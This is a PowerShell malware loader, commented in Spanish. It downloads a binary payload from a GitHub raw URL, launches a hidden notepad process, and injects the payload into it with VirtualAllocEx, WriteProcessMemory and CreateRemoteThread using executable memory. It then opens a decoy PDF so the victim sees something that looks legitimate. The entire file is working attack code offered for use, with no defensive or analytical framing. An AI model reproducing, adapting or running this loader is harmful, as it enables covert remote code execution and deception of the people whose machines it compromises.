# loader.ps1 - DESCARGAR E INYECTAR EN MEMORIA
$urlPayload = "https://raw.githubusercontent.com/xmxotemx/master-univer/main/payload.bin"
$payload = (New-Object Net.WebClient).DownloadData($urlPayload)

$notepad = Get-Process -Name "notepad" -ErrorAction SilentlyContinue
if (-not $notepad) { Start-Process "notepad.exe" -WindowStyle Hidden; Start-Sleep -Seconds 1; $notepad = Get-Process -Name "notepad" }

$kernel32 = Add-Type -memberDefinition @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
[DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@ -name "Win32" -namespace "Win32Functions" -passThru

$mem = $kernel32::VirtualAllocEx($notepad.Handle, [IntPtr]::Zero, $payload.Length, 0x3000, 0x40)
$kernel32::WriteProcessMemory($notepad.Handle, $mem, $payload, $payload.Length, [ref] [IntPtr]::Zero)
$kernel32::CreateRemoteThread($notepad.Handle, [IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# Abrir el PDF real (para que la víctima vea algo legítimo)
Start-Process "https://raw.githubusercontent.com/xmxotemx/master-univer/main/cebo.pdf"